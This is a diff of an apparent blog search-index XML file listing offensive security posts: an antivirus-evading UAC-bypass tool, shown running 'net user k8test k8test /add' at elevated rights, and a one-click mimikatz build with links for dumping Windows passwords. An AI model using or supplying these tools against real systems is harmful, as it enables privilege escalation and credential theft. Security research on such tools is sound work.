+<p><a href="https://github.com/k8gege/K8tools/blob/master/mz.exe" target="_blank">https://github.com/k8gege/K8tools/blob/master/mz.exe</a></p>
+<p><a href="https://github.com/k8gege/K8tools/blob/master/mz64.exe" target="_blank">https://github.com/k8gege/K8tools/blob/master/mz64.exe</a></p>
+<p>PowerShell</p>
+<p><a href="https://github.com/k8gege/K8tools/blob/master/Invoke-Mimikatz.ps1" target="_blank">https://github.com/k8gege/K8tools/blob/master/Invoke-Mimikatz.ps1</a></p>]]></content>
+      <categories>
+        <category>提权</category>
+        <category>工具</category>
+        <category>密码</category>
+        <category>PowerShell</category>
+      </categories>
+      <tags>
+        <tag>Tool</tag>
+        <tag>PowerShell</tag>
+        <tag>mimikatz</tag>
       </tags>
   </entry>
   <entry>
@@ -3359,52 +3405,6 @@ xxe_data = r"""&lt;!DOCTYPE Autodiscover [
       </tags>
   </entry>
   <entry>
-    <title>K8uac bypassUAC(Win7/Wi8/Win10) 过46款杀软影响所有Windows版本</title>
-    <url>/p/41e1c61c.html</url>
-    <content><![CDATA[<p>[原创]K8uac bypassUAC(Win7/Wi8/Win10) 过46款杀软影响所有Windows版本</p>
-<p>工具: k8uac<br>编译: VC++</p>
-<p>作者:K8哥哥<br>发布:&nbsp;2018/11/25 1:30</p>
-<p>这是一个旧方法，近两年很多APT都有在使用，前几天测试发现依然可用。</p>
-<p>不但支持全系统而且还免杀,你让我上哪说理去。</p>
-<p>免杀报告:<a href="http://r.virscan.org/language/en/report/2b1a19189b37d4f605b564c4e71227f6" target="_blank">http://r.virscan.org/language/en/report/2b1a19189b37d4f605b564c4e71227f6</a></p>
-<p>示例如下:</p>
-<p>C:\Users\K8team\Desktop&gt;k8uac<br>BypassUAC (Win7/Win8/Win10) by K8哥哥<br>useage:k8uac cmdline<br><br>C:\Users\K8team\Desktop&gt;k8uac "net user k8test k8test /add"<br>BypassUAC (Win7/Win8/Win10) by K8哥哥<br>success!<br>0操作成功完成。</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/k8uac.png"></p>
-<p>&nbsp;下载：<a href="https://files.cnblogs.com/files/k8gege/k8uac_20181125%5BK8%5D.rar" target="_blank">https://files.cnblogs.com/files/k8gege/k8uac_20181125%5BK8%5D.rar</a></p>]]></content>
-      <categories>
-        <category>提权</category>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>Exp</tag>
-        <tag>Tool</tag>
-        <tag>BypassUAC</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>mimikatz 2.1.1一键版 &amp; PowerShell</title>
-    <url>/p/77429fa6.html</url>
-    <content><![CDATA[<p>无需任何参数,运行EXE即可自动读取Windows系统密码</p>
-<p>EXE版需要其它功能请使用原版 (参数已写死仅读密码)</p>
-<p>结果保存于当前目录mz.log</p>
-<p>EXE</p>
-<p><a href="https://github.com/k8gege/K8tools/blob/master/mz.exe" target="_blank">https://github.com/k8gege/K8tools/blob/master/mz.exe</a></p>
-<p><a href="https://github.com/k8gege/K8tools/blob/master/mz64.exe" target="_blank">https://github.com/k8gege/K8tools/blob/master/mz64.exe</a></p>
-<p>PowerShell</p>
-<p><a href="https://github.com/k8gege/K8tools/blob/master/Invoke-Mimikatz.ps1" target="_blank">https://github.com/k8gege/K8tools/blob/master/Invoke-Mimikatz.ps1</a></p>]]></content>
-      <categories>
-        <category>提权</category>
-        <category>工具</category>
-        <category>密码</category>
-        <category>PowerShell</category>
-      </categories>
-      <tags>
-        <tag>Tool</tag>
-        <tag>PowerShell</tag>
-        <tag>mimikatz</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>基于Browser协议探测内网主机</title>
     <url>/p/16b5ff0b.html</url>
     <content><![CDATA[<p>利用Browser协议可获取机器IP、MAC、机器名、操作系统、域，如图</p>
@@ -3467,8 +3467,8 @@ from pprint import pprint
 <p><a href="https://www.cnblogs.com/k8gege/p/10367844.html" target="_blank">https://www.cnblogs.com/k8gege/p/10367844.html</a></p>]]></content>
       <categories>
         <category>工具</category>
-        <category>Python</category>
         <category>内网</category>
+        <category>Python</category>
         <category>源码</category>
         <category>嗅探</category>
         <category>编程</category>
